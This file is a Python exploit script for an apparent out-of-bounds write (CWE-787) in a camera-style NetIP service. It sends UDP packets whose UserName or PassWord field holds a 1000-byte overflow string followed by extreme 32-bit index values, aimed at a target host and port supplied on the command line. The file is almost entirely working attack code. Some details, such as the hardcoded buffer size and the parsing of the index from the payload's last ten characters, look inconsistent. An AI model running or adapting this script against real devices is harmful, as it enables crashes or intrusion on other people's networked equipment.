#!/usr/bin/env python3
import socket
import sys
import json
import time
import struct

def create_payload(index, example_type):
    """
    Create payload for CWE-787 exploit
    example_type: 1 for direct buffer write, 2 for indirect buffer write
    """
    if example_type == 1:
        # Example 1: Direct buffer write
        # Create a large payload that will overflow the buffer
        payload = "A" * 1000  # Large string to ensure overflow
        payload += str(index)  # Add the index at the end
        return payload
    else:
        # Example 2: Indirect buffer write
        # Create a large payload with the transformed index
        target_pos = index
        original_index = (target_pos - 32) // 2
        payload = "B" * 1000  # Large string to ensure overflow
        payload += str(original_index)  # Add the transformed index
        return payload

def send_exploit(host, port, payload, example_type):
    """Send exploit payload to the target"""
    # Create UDP socket with larger buffer
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)  # Increase send buffer
    
    # Create JSON payload
    data = {
        "NetWork.NetCommon": {
            "HostName": "Test Camera",
            "MAC": "00:11:22:33:44:55",
            "HostIP": "0x0100007f",  # 127.0.0.1
            "TCPPort": 34569,
            "ChannelNum": 1,
            "SN": "TEST123",
            "Version": "1.0.0",
            "BuildDate": "2024-03-20 12:00:00"
        }
    }
    
    # Add payload to appropriate field
    if example_type == 1:
        data["NetWork.NetCommon"]["UserName"] = payload
        data["NetWork.NetCommon"]["PassWord"] = "test"
        field = "UserName"
    else:
        data["NetWork.NetCommon"]["UserName"] = "test"
        data["NetWork.NetCommon"]["PassWord"] = payload
        field = "PassWord"
    
    # Convert to JSON string
    json_data = json.dumps(data)
    
    # Create NetIP packet with larger header
    header = b"\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xfa\x05\x00\x00\x00\x00"
    packet = header + json_data.encode()
    
    try:
        # Send packet
        sock.sendto(packet, (host, port))
        print(f"[+] Sent UDP packet to {host}:{port}")
        print(f"[+] Target field: {field}")
        print(f"[+] Payload size: {len(payload)} bytes")
        print(f"[+] Index value: {index}")
        if example_type == 2:
            final_index = (int(payload[-10:]) + 32) * 2  # Get last 10 chars as index
            print(f"[+] After transformations: index = {final_index}")
        print(f"[+] Buffer size: 64 bytes")
        print(f"[+] Overflow size: {len(payload)} bytes")
            
    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        sock.close()

def main():
    if len(sys.argv) != 4:
        print(f"Usage: {sys.argv[0]} <host> <port> <example_type>")
        print("Example types:")
        print("  1: Direct buffer write (UserName field)")
        print("  2: Indirect buffer write (PassWord field)")
        sys.exit(1)
        
    host = sys.argv[1]
    port = int(sys.argv[2])
    example_type = int(sys.argv[3])
    
    if example_type not in [1, 2]:
        print("[-] Invalid example type. Use 1 or 2.")
        sys.exit(1)
    
    # Test only extremely large indices (both negative and positive)
    test_indices = [
        # Negative indices
        -1000000000,   # -1 billion
        -2000000000,   # -2 billion
        -2147483648,   # Min 32-bit integer
        
        # Positive indices
        1000000000,    # 1 billion
        2000000000,    # 2 billion
        2147483647     # Max 32-bit integer
    ]
    
    for index in test_indices:
        print(f"\n[*] Testing index: {index}")
        payload = create_payload(index, example_type)
        send_exploit(host, port, payload, example_type)
        time.sleep(1)  # Wait between requests

if __name__ == "__main__":
    main() 